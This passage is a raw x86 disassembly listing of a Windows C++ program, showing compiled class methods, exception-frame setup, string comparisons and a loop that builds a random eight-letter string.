  4016c8:	66 0f 13 45 e4       	movlpd %xmm0,-0x1c(%ebp)
  4016cd:	66 0f 13 45 ec       	movlpd %xmm0,-0x14(%ebp)
  4016d2:	66 0f 13 45 f4       	movlpd %xmm0,-0xc(%ebp)
  4016d7:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4016de:	c7 45 c4 3c 00 00 00 	movl   $0x3c,-0x3c(%ebp)
  4016e5:	85 c0                	test   %eax,%eax
  4016e7:	75 11                	jne    0x4016fa
  4016e9:	39 41 24             	cmp    %eax,0x24(%ecx)
  4016ec:	75 09                	jne    0x4016f7
  4016ee:	c7 45 d4 c0 57 43 00 	movl   $0x4357c0,-0x2c(%ebp)
  4016f5:	eb 06                	jmp    0x4016fd
  4016f7:	8b 41 1c             	mov    0x1c(%ecx),%eax
  4016fa:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4016fd:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401700:	c7 45 d0 68 5c 43 00 	movl   $0x435c68,-0x30(%ebp)
  401707:	50                   	push   %eax
  401708:	c7 45 c8 00 80 00 00 	movl   $0x8000,-0x38(%ebp)
  40170f:	c7 45 e0 0a 00 00 00 	movl   $0xa,-0x20(%ebp)
  401716:	ff 15 34 52 43 00    	call   *0x435234
  40171c:	8b e5                	mov    %ebp,%esp
  40171e:	5d                   	pop    %ebp
  40171f:	c3                   	ret
  401720:	55                   	push   %ebp
  401721:	8b ec                	mov    %esp,%ebp
  401723:	6a ff                	push   $0xffffffff
  401725:	68 ce ed 42 00       	push   $0x42edce
  40172a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401730:	50                   	push   %eax
  401731:	83 ec 3c             	sub    $0x3c,%esp
  401734:	56                   	push   %esi
  401735:	57                   	push   %edi
  401736:	a1 0c 40 44 00       	mov    0x44400c,%eax
  40173b:	33 c5                	xor    %ebp,%eax
  40173d:	50                   	push   %eax
  40173e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401741:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401747:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40174a:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40174d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401754:	e8 e7 0f 00 00       	call   0x402740
  401759:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401760:	68 02 01 00 00       	push   $0x102
  401765:	e8 e2 c7 02 00       	call   0x42df4c
  40176a:	68 02 01 00 00       	push   $0x102
  40176f:	8b f8                	mov    %eax,%edi
  401771:	6a 00                	push   $0x0
  401773:	57                   	push   %edi
  401774:	e8 9b d3 02 00       	call   0x42eb14
  401779:	0f 10 05 74 5c 43 00 	movups 0x435c74,%xmm0
  401780:	6a 12                	push   $0x12
  401782:	0f 11 07             	movups %xmm0,(%edi)
  401785:	0f 10 05 84 5c 43 00 	movups 0x435c84,%xmm0
  40178c:	0f 11 47 10          	movups %xmm0,0x10(%edi)
  401790:	0f 10 05 94 5c 43 00 	movups 0x435c94,%xmm0
  401797:	0f 11 47 20          	movups %xmm0,0x20(%edi)
  40179b:	a1 a4 5c 43 00       	mov    0x435ca4,%eax
  4017a0:	89 47 30             	mov    %eax,0x30(%edi)
  4017a3:	66 a1 a8 5c 43 00    	mov    0x435ca8,%ax
  4017a9:	66 89 47 34          	mov    %ax,0x34(%edi)
  4017ad:	e8 9a c7 02 00       	call   0x42df4c
  4017b2:	0f 57 c0             	xorps  %xmm0,%xmm0
  4017b5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4017b8:	83 c4 14             	add    $0x14,%esp
  4017bb:	c7 45 f0 08 00 00 00 	movl   $0x8,-0x10(%ebp)
  4017c2:	8b f0                	mov    %eax,%esi
  4017c4:	0f 11 00             	movups %xmm0,(%eax)
  4017c7:	66 c7 40 10 00 00    	movw   $0x0,0x10(%eax)
  4017cd:	0f 1f 00             	nopl   (%eax)
  4017d0:	ff 15 dc 54 43 00    	call   *0x4354dc
  4017d6:	33 d2                	xor    %edx,%edx
  4017d8:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  4017dd:	f7 f1                	div    %ecx
  4017df:	6a 01                	push   $0x1
  4017e1:	8d 04 57             	lea    (%edi,%edx,2),%eax
  4017e4:	50                   	push   %eax
  4017e5:	56                   	push   %esi
  4017e6:	ff 15 c0 54 43 00    	call   *0x4354c0
  4017ec:	83 c4 0c             	add    $0xc,%esp
  4017ef:	83 c6 02             	add    $0x2,%esi
  4017f2:	83 6d f0 01          	subl   $0x1,-0x10(%ebp)
  4017f6:	75 d8                	jne    0x4017d0
  4017f8:	57                   	push   %edi
  4017f9:	e8 57 c7 02 00       	call   0x42df55
  4017fe:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401801:	83 c4 04             	add    $0x4,%esp
  401804:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  40180b:	85 c0                	test   %eax,%eax
  40180d:	74 0a                	je     0x401819
  40180f:	50                   	push   %eax
  401810:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401813:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401816:	ff 50 0c             	call   *0xc(%eax)
  401819:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40181c:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401823:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40182a:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  401831:	66 83 3e 00          	cmpw   $0x0,(%esi)
  401835:	74 09                	je     0x401840
  401837:	56                   	push   %esi
  401838:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40183b:	e8 60 bd 01 00       	call   0x41d5a0
  401840:	56                   	push   %esi
  401841:	e8 0f c7 02 00       	call   0x42df55
  401846:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  401849:	83 c4 04             	add    $0x4,%esp
  40184c:	85 d2                	test   %edx,%edx
  40184e:	75 0d                	jne    0x40185d
  401850:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  401854:	ba c0 57 43 00       	mov    $0x4357c0,%edx
  401859:	0f 45 55 d4          	cmovne -0x2c(%ebp),%edx
  40185d:	8b 75 e8             	mov    -0x18(%ebp),%esi
  401860:	8b ce                	mov    %esi,%ecx
  401862:	e8 d9 0e 00 00       	call   0x402740
  401867:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40186b:	8b ce                	mov    %esi,%ecx
  40186d:	52                   	push   %edx
  40186e:	c7 06 bc 5c 43 00    	movl   $0x435cbc,(%esi)
  401874:	e8 b7 cf 01 00       	call   0x41e830
  401879:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40187d:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  401884:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  401888:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40188b:	e8 90 03 00 00       	call   0x401c20
  401890:	8b c6                	mov    %esi,%eax
  401892:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401895:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40189c:	59                   	pop    %ecx
  40189d:	5f                   	pop    %edi
  40189e:	5e                   	pop    %esi
  40189f:	8b e5                	mov    %ebp,%esp
  4018a1:	5d                   	pop    %ebp
  4018a2:	c2 04 00             	ret    $0x4
  4018a5:	cc                   	int3
  4018a6:	cc                   	int3
  4018a7:	cc                   	int3
  4018a8:	cc                   	int3
  4018a9:	cc                   	int3
  4018aa:	cc                   	int3
  4018ab:	cc                   	int3
  4018ac:	cc                   	int3
  4018ad:	cc                   	int3
  4018ae:	cc                   	int3
  4018af:	cc                   	int3
  4018b0:	e9 eb 04 00 00       	jmp    0x401da0
  4018b5:	cc                   	int3
  4018b6:	cc                   	int3
  4018b7:	cc                   	int3
  4018b8:	cc                   	int3
  4018b9:	cc                   	int3
  4018ba:	cc                   	int3
  4018bb:	cc                   	int3
  4018bc:	cc                   	int3
  4018bd:	cc                   	int3
  4018be:	cc                   	int3
  4018bf:	cc                   	int3
  4018c0:	55                   	push   %ebp
  4018c1:	8b ec                	mov    %esp,%ebp
  4018c3:	8b 55 08             	mov    0x8(%ebp),%edx
  4018c6:	56                   	push   %esi
  4018c7:	8b f1                	mov    %ecx,%esi
  4018c9:	8b 42 04             	mov    0x4(%edx),%eax
  4018cc:	33 46 04             	xor    0x4(%esi),%eax
  4018cf:	a8 01                	test   $0x1,%al
  4018d1:	75 69                	jne    0x40193c
  4018d3:	8b 46 08             	mov    0x8(%esi),%eax
  4018d6:	3b 42 08             	cmp    0x8(%edx),%eax
  4018d9:	75 61                	jne    0x40193c
  4018db:	8b 4a 0c             	mov    0xc(%edx),%ecx
  4018de:	85 c9                	test   %ecx,%ecx
  4018e0:	75 0d                	jne    0x4018ef
  4018e2:	39 4a 24             	cmp    %ecx,0x24(%edx)
  4018e5:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  4018ea:	74 03                	je     0x4018ef
  4018ec:	8b 4a 1c             	mov    0x1c(%edx),%ecx
  4018ef:	8b 46 0c             	mov    0xc(%esi),%eax
  4018f2:	85 c0                	test   %eax,%eax
  4018f4:	75 0d                	jne    0x401903
  4018f6:	39 46 24             	cmp    %eax,0x24(%esi)
  4018f9:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  4018fe:	74 03                	je     0x401903
  401900:	8b 46 1c             	mov    0x1c(%esi),%eax
  401903:	66 8b 10             	mov    (%eax),%dx
  401906:	66 3b 11             	cmp    (%ecx),%dx
  401909:	75 1e                	jne    0x401929
  40190b:	66 85 d2             	test   %dx,%dx
  40190e:	74 15                	je     0x401925
  401910:	66 8b 50 02          	mov    0x2(%eax),%dx
  401914:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  401918:	75 0f                	jne    0x401929
  40191a:	83 c0 04             	add    $0x4,%eax
  40191d:	83 c1 04             	add    $0x4,%ecx
  401920:	66 85 d2             	test   %dx,%dx
  401923:	75 de                	jne    0x401903
  401925:	33 c0                	xor    %eax,%eax
  401927:	eb 05                	jmp    0x40192e
  401929:	1b c0                	sbb    %eax,%eax
  40192b:	83 c8 01             	or     $0x1,%eax
  40192e:	85 c0                	test   %eax,%eax
  401930:	75 0a                	jne    0x40193c
  401932:	b8 01 00 00 00       	mov    $0x1,%eax
  401937:	5e                   	pop    %esi
  401938:	5d                   	pop    %ebp
  401939:	c2 04 00             	ret    $0x4
  40193c:	33 c0                	xor    %eax,%eax
  40193e:	5e                   	pop    %esi
  40193f:	5d                   	pop    %ebp
  401940:	c2 04 00             	ret    $0x4
  401943:	cc                   	int3
  401944:	cc                   	int3
  401945:	cc                   	int3
  401946:	cc                   	int3
  401947:	cc                   	int3
  401948:	cc                   	int3
  401949:	cc                   	int3
  40194a:	cc                   	int3
  40194b:	cc                   	int3
  40194c:	cc                   	int3
  40194d:	cc                   	int3
  40194e:	cc                   	int3
  40194f:	cc                   	int3
  401950:	55                   	push   %ebp
  401951:	8b ec                	mov    %esp,%ebp
  401953:	53                   	push   %ebx
  401954:	56                   	push   %esi
  401955:	57                   	push   %edi
  401956:	8b d9                	mov    %ecx,%ebx
  401958:	e8 43 04 00 00       	call   0x401da0
  40195d:	8b 7d 08             	mov    0x8(%ebp),%edi
  401960:	8b f0                	mov    %eax,%esi
  401962:	8b cf                	mov    %edi,%ecx
  401964:	8b 17                	mov    (%edi),%edx
  401966:	ff 52 14             	call   *0x14(%edx)
  401969:	3b f0                	cmp    %eax,%esi
  40196b:	74 2d                	je     0x40199a
  40196d:	8b 48 0c             	mov    0xc(%eax),%ecx
  401970:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  401973:	75 1c                	jne    0x401991
  401975:	8b 4e 08             	mov    0x8(%esi),%ecx
  401978:	39 48 08             	cmp    %ecx,0x8(%eax)
  40197b:	75 14                	jne    0x401991
  40197d:	51                   	push   %ecx
  40197e:	ff 76 04             	push   0x4(%esi)
  401981:	ff 70 04             	push   0x4(%eax)
  401984:	ff 15 c4 54 43 00    	call   *0x4354c4
  40198a:	83 c4 0c             	add    $0xc,%esp
  40198d:	85 c0                	test   %eax,%eax
  40198f:	74 09                	je     0x40199a
  401991:	5f                   	pop    %edi
  401992:	5e                   	pop    %esi
  401993:	33 c0                	xor    %eax,%eax
  401995:	5b                   	pop    %ebx
  401996:	5d                   	pop    %ebp
  401997:	c2 04 00             	ret    $0x4
  40199a:	57                   	push   %edi
  40199b:	8b cb                	mov    %ebx,%ecx
  40199d:	e8 1e ff ff ff       	call   0x4018c0
  4019a2:	5f                   	pop    %edi
  4019a3:	5e                   	pop    %esi
  4019a4:	5b                   	pop    %ebx
  4019a5:	5d                   	pop    %ebp
  4019a6:	c2 04 00             	ret    $0x4
  4019a9:	cc                   	int3
  4019aa:	cc                   	int3
  4019ab:	cc                   	int3
  4019ac:	cc                   	int3
  4019ad:	cc                   	int3
  4019ae:	cc                   	int3
  4019af:	cc                   	int3
  4019b0:	55                   	push   %ebp
  4019b1:	8b ec                	mov    %esp,%ebp
  4019b3:	6a ff                	push   $0xffffffff
  4019b5:	68 fd ed 42 00       	push   $0x42edfd
  4019ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4019c0:	50                   	push   %eax
  4019c1:	51                   	push   %ecx
  4019c2:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4019c7:	33 c5                	xor    %ebp,%eax
  4019c9:	50                   	push   %eax
  4019ca:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4019cd:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4019d3:	83 3d c8 69 44 00 2c 	cmpl   $0x2c,0x4469c8
  4019da:	7c 2c                	jl     0x401a08
  4019dc:	68 cc 69 44 00       	push   $0x4469cc
  4019e1:	e8 1a c3 01 00       	call   0x41dd00
  4019e6:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  4019ec:	83 c4 04             	add    $0x4,%esp
  4019ef:	85 c9                	test   %ecx,%ecx
  4019f1:	74 07                	je     0x4019fa
  4019f3:	8b 01                	mov    (%ecx),%eax
  4019f5:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  4019fa:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  401a01:	00 00 00 
  401a04:	85 c9                	test   %ecx,%ecx
  401a06:	75 1f                	jne    0x401a27
  401a08:	6a 2c                	push   $0x2c
  401a0a:	6a 00                	push   $0x0
  401a0c:	ff 15 d8 51 43 00    	call   *0x4351d8
  401a12:	50                   	push   %eax
  401a13:	ff 15 e8 51 43 00    	call   *0x4351e8
  401a19:	8b c8                	mov    %eax,%ecx
  401a1b:	85 c9                	test   %ecx,%ecx
  401a1d:	75 08                	jne    0x401a27
  401a1f:	6a ff                	push   $0xffffffff
  401a21:	ff 15 4c 54 43 00    	call   *0x43544c
  401a27:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401a2a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401a31:	e8 0a 0d 00 00       	call   0x402740
  401a36:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401a3d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401a40:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401a47:	59                   	pop    %ecx
  401a48:	8b e5                	mov    %ebp,%esp
  401a4a:	5d                   	pop    %ebp
  401a4b:	c3                   	ret
  401a4c:	cc                   	int3
  401a4d:	cc                   	int3
  401a4e:	cc                   	int3
  401a4f:	cc                   	int3
  401a50:	55                   	push   %ebp
  401a51:	8b ec                	mov    %esp,%ebp
  401a53:	6a ff                	push   $0xffffffff
  401a55:	68 2d ee 42 00       	push   $0x42ee2d
  401a5a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401a60:	50                   	push   %eax
  401a61:	51                   	push   %ecx
  401a62:	53                   	push   %ebx
  401a63:	56                   	push   %esi
  401a64:	57                   	push   %edi
  401a65:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401a6a:	33 c5                	xor    %ebp,%eax
  401a6c:	50                   	push   %eax
  401a6d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401a70:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401a76:	8b d9                	mov    %ecx,%ebx
  401a78:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  401a7b:	e8 c0 0c 00 00       	call   0x402740
  401a80:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401a87:	8d 4b 10             	lea    0x10(%ebx),%ecx
  401a8a:	8b 7d 08             	mov    0x8(%ebp),%edi
  401a8d:	c7 03 bc 5c 43 00    	movl   $0x435cbc,(%ebx)
  401a93:	8b 47 04             	mov    0x4(%edi),%eax
  401a96:	89 43 04             	mov    %eax,0x4(%ebx)
  401a99:	8b 47 08             	mov    0x8(%edi),%eax
  401a9c:	89 43 08             	mov    %eax,0x8(%ebx)
  401a9f:	8b 47 0c             	mov    0xc(%edi),%eax
  401aa2:	89 43 0c             	mov    %eax,0xc(%ebx)
  401aa5:	8b 43 10             	mov    0x10(%ebx),%eax
  401aa8:	ff 50 44             	call   *0x44(%eax)
  401aab:	8d 47 10             	lea    0x10(%edi),%eax
  401aae:	50                   	push   %eax
  401aaf:	8d 4b 10             	lea    0x10(%ebx),%ecx
  401ab2:	e8 c9 07 00 00       	call   0x402280
  401ab7:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401abe:	8b c3                	mov    %ebx,%eax
  401ac0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ac3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401aca:	59                   	pop    %ecx
  401acb:	5f                   	pop    %edi
  401acc:	5e                   	pop    %esi
  401acd:	5b                   	pop    %ebx
  401ace:	8b e5                	mov    %ebp,%esp
  401ad0:	5d                   	pop    %ebp
  401ad1:	c2 04 00             	ret    $0x4
  401ad4:	cc                   	int3
  401ad5:	cc                   	int3
  401ad6:	cc                   	int3
  401ad7:	cc                   	int3
  401ad8:	cc                   	int3
  401ad9:	cc                   	int3
  401ada:	cc                   	int3
  401adb:	cc                   	int3
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	55                   	push   %ebp
  401ae1:	8b ec                	mov    %esp,%ebp
  401ae3:	6a ff                	push   $0xffffffff
  401ae5:	68 65 ee 42 00       	push   $0x42ee65
  401aea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401af0:	50                   	push   %eax
  401af1:	51                   	push   %ecx
  401af2:	53                   	push   %ebx
  401af3:	56                   	push   %esi
  401af4:	57                   	push   %edi
  401af5:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401afa:	33 c5                	xor    %ebp,%eax
  401afc:	50                   	push   %eax
  401afd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401b00:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401b06:	8b d9                	mov    %ecx,%ebx
  401b08:	83 3d c8 69 44 00 2c 	cmpl   $0x2c,0x4469c8
  401b0f:	7c 2c                	jl     0x401b3d
  401b11:	68 cc 69 44 00       	push   $0x4469cc
  401b16:	e8 e5 c1 01 00       	call   0x41dd00
  401b1b:	8b 3d c4 69 44 00    	mov    0x4469c4,%edi
  401b21:	83 c4 04             	add    $0x4,%esp
  401b24:	85 ff                	test   %edi,%edi
  401b26:	74 07                	je     0x401b2f
  401b28:	8b 07                	mov    (%edi),%eax
  401b2a:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  401b2f:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  401b36:	00 00 00 
  401b39:	85 ff                	test   %edi,%edi
  401b3b:	75 1f                	jne    0x401b5c
  401b3d:	6a 2c                	push   $0x2c
  401b3f:	6a 00                	push   $0x0
  401b41:	ff 15 d8 51 43 00    	call   *0x4351d8
  401b47:	50                   	push   %eax
  401b48:	ff 15 e8 51 43 00    	call   *0x4351e8
  401b4e:	8b f8                	mov    %eax,%edi
  401b50:	85 ff                	test   %edi,%edi
  401b52:	75 08                	jne    0x401b5c
  401b54:	6a ff                	push   $0xffffffff
  401b56:	ff 15 4c 54 43 00    	call   *0x43544c
  401b5c:	89 7d f0             	mov    %edi,-0x10(%ebp)
  401b5f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401b66:	8b cf                	mov    %edi,%ecx
  401b68:	e8 d3 0b 00 00       	call   0x402740
  401b6d:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401b71:	8d 4f 10             	lea    0x10(%edi),%ecx
  401b74:	c7 07 bc 5c 43 00    	movl   $0x435cbc,(%edi)
  401b7a:	8b 43 04             	mov    0x4(%ebx),%eax
  401b7d:	89 47 04             	mov    %eax,0x4(%edi)
  401b80:	8b 43 08             	mov    0x8(%ebx),%eax
  401b83:	89 47 08             	mov    %eax,0x8(%edi)
  401b86:	8b 43 0c             	mov    0xc(%ebx),%eax
  401b89:	89 47 0c             	mov    %eax,0xc(%edi)
  401b8c:	8b 47 10             	mov    0x10(%edi),%eax
  401b8f:	ff 50 44             	call   *0x44(%eax)
  401b92:	8d 43 10             	lea    0x10(%ebx),%eax
  401b95:	50                   	push   %eax
  401b96:	8d 4f 10             	lea    0x10(%edi),%ecx
  401b99:	e8 e2 06 00 00       	call   0x402280
  401b9e:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401ba5:	8b c7                	mov    %edi,%eax
  401ba7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401baa:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401bb1:	59                   	pop    %ecx
  401bb2:	5f                   	pop    %edi
  401bb3:	5e                   	pop    %esi
  401bb4:	5b                   	pop    %ebx
  401bb5:	8b e5                	mov    %ebp,%esp
  401bb7:	5d                   	pop    %ebp
  401bb8:	c3                   	ret
  401bb9:	cc                   	int3
  401bba:	cc                   	int3
  401bbb:	cc                   	int3
  401bbc:	cc                   	int3
  401bbd:	cc                   	int3
  401bbe:	cc                   	int3
  401bbf:	cc                   	int3
  401bc0:	55                   	push   %ebp
  401bc1:	8b ec                	mov    %esp,%ebp
  401bc3:	53                   	push   %ebx
  401bc4:	56                   	push   %esi
  401bc5:	57                   	push   %edi
  401bc6:	8b 7d 08             	mov    0x8(%ebp),%edi
  401bc9:	8b d9                	mov    %ecx,%ebx
  401bcb:	8b 37                	mov    (%edi),%esi
  401bcd:	e8 ce 01 00 00       	call   0x401da0
  401bd2:	50                   	push   %eax
  401bd3:	8b cf                	mov    %edi,%ecx
  401bd5:	ff 56 34             	call   *0x34(%esi)
  401bd8:	85 c0                	test   %eax,%eax
  401bda:	74 3a                	je     0x401c16
  401bdc:	8b 03                	mov    (%ebx),%eax
  401bde:	8b cb                	mov    %ebx,%ecx
  401be0:	ff 50 44             	call   *0x44(%eax)
  401be3:	8b 47 04             	mov    0x4(%edi),%eax
  401be6:	8d 4b 10             	lea    0x10(%ebx),%ecx
  401be9:	89 43 04             	mov    %eax,0x4(%ebx)
  401bec:	8b 47 08             	mov    0x8(%edi),%eax
  401bef:	89 43 08             	mov    %eax,0x8(%ebx)
  401bf2:	8b 47 0c             	mov    0xc(%edi),%eax
  401bf5:	89 43 0c             	mov    %eax,0xc(%ebx)
  401bf8:	8b 43 10             	mov    0x10(%ebx),%eax
  401bfb:	ff 50 44             	call   *0x44(%eax)
  401bfe:	8d 47 10             	lea    0x10(%edi),%eax
  401c01:	50                   	push   %eax
  401c02:	8d 4b 10             	lea    0x10(%ebx),%ecx
  401c05:	e8 76 06 00 00       	call   0x402280
  401c0a:	5f                   	pop    %edi
  401c0b:	5e                   	pop    %esi
  401c0c:	b8 01 00 00 00       	mov    $0x1,%eax
  401c11:	5b                   	pop    %ebx
  401c12:	5d                   	pop    %ebp
  401c13:	c2 04 00             	ret    $0x4
  401c16:	5f                   	pop    %edi
  401c17:	5e                   	pop    %esi
  401c18:	33 c0                	xor    %eax,%eax
  401c1a:	5b                   	pop    %ebx
  401c1b:	5d                   	pop    %ebp
  401c1c:	c2 04 00             	ret    $0x4
  401c1f:	cc                   	int3
  401c20:	55                   	push   %ebp
  401c21:	8b ec                	mov    %esp,%ebp
  401c23:	6a ff                	push   $0xffffffff
  401c25:	68 b0 ee 42 00       	push   $0x42eeb0
  401c2a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401c30:	50                   	push   %eax
  401c31:	83 ec 08             	sub    $0x8,%esp
  401c34:	56                   	push   %esi
  401c35:	57                   	push   %edi
  401c36:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401c3b:	33 c5                	xor    %ebp,%eax
  401c3d:	50                   	push   %eax
  401c3e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401c41:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401c47:	8b f9                	mov    %ecx,%edi
  401c49:	89 7d f0             	mov    %edi,-0x10(%ebp)
  401c4c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401c53:	8d 77 10             	lea    0x10(%edi),%esi
  401c56:	89 75 ec             	mov    %esi,-0x14(%ebp)
  401c59:	c7 06 10 5d 43 00    	movl   $0x435d10,(%esi)
  401c5f:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  401c63:	8b 4e 0c             	mov    0xc(%esi),%ecx
  401c66:	85 c9                	test   %ecx,%ecx
  401c68:	74 1d                	je     0x401c87
  401c6a:	8b 06                	mov    (%esi),%eax
  401c6c:	51                   	push   %ecx
  401c6d:	8b 40 0c             	mov    0xc(%eax),%eax
  401c70:	3d 40 b7 41 00       	cmp    $0x41b740,%eax
  401c75:	75 0c                	jne    0x401c83
  401c77:	b9 b8 69 44 00       	mov    $0x4469b8,%ecx
  401c7c:	e8 4f c2 01 00       	call   0x41ded0
  401c81:	eb 04                	jmp    0x401c87
  401c83:	8b ce                	mov    %esi,%ecx
  401c85:	ff d0                	call   *%eax
  401c87:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  401c8e:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  401c95:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  401c9c:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  401ca0:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  401ca6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401cad:	c7 07 74 5d 43 00    	movl   $0x435d74,(%edi)
  401cb3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401cb6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401cbd:	59                   	pop    %ecx
  401cbe:	5f                   	pop    %edi
  401cbf:	5e                   	pop    %esi
  401cc0:	8b e5                	mov    %ebp,%esp
  401cc2:	5d                   	pop    %ebp
  401cc3:	c3                   	ret
  401cc4:	cc                   	int3
  401cc5:	cc                   	int3
  401cc6:	cc                   	int3
  401cc7:	cc                   	int3
  401cc8:	cc                   	int3
  401cc9:	cc                   	int3
  401cca:	cc                   	int3
  401ccb:	cc                   	int3
  401ccc:	cc                   	int3
  401ccd:	cc                   	int3
  401cce:	cc                   	int3
  401ccf:	cc                   	int3
  401cd0:	55                   	push   %ebp
  401cd1:	8b ec                	mov    %esp,%ebp
  401cd3:	6a ff                	push   $0xffffffff
  401cd5:	68 dd ee 42 00       	push   $0x42eedd
  401cda:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401ce0:	50                   	push   %eax
  401ce1:	83 ec 2c             	sub    $0x2c,%esp
  401ce4:	56                   	push   %esi
  401ce5:	57                   	push   %edi
  401ce6:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401ceb:	33 c5                	xor    %ebp,%eax
  401ced:	50                   	push   %eax
  401cee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401cf1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401cf7:	8b f1                	mov    %ecx,%esi
  401cf9:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401cfc:	e8 3f 0a 00 00       	call   0x402740
  401d01:	8b f8                	mov    %eax,%edi
  401d03:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401d0a:	8b ce                	mov    %esi,%ecx
  401d0c:	8b 16                	mov    (%esi),%edx
  401d0e:	ff 52 44             	call   *0x44(%edx)
  401d11:	8b 4f 04             	mov    0x4(%edi),%ecx
  401d14:	89 4e 04             	mov    %ecx,0x4(%esi)
  401d17:	8b 4f 08             	mov    0x8(%edi),%ecx
  401d1a:	89 4e 08             	mov    %ecx,0x8(%esi)
  401d1d:	8d 4e 10             	lea    0x10(%esi),%ecx
  401d20:	8b 47 0c             	mov    0xc(%edi),%eax
  401d23:	89 46 0c             	mov    %eax,0xc(%esi)
  401d26:	8b 46 10             	mov    0x10(%esi),%eax
  401d29:	ff 50 44             	call   *0x44(%eax)
  401d2c:	8d 47 10             	lea    0x10(%edi),%eax
  401d2f:	50                   	push   %eax
  401d30:	8d 4e 10             	lea    0x10(%esi),%ecx
  401d33:	e8 48 05 00 00       	call   0x402280
  401d38:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401d3f:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401d42:	e8 d9 fe ff ff       	call   0x401c20
  401d47:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d4a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401d51:	59                   	pop    %ecx
  401d52:	5f                   	pop    %edi
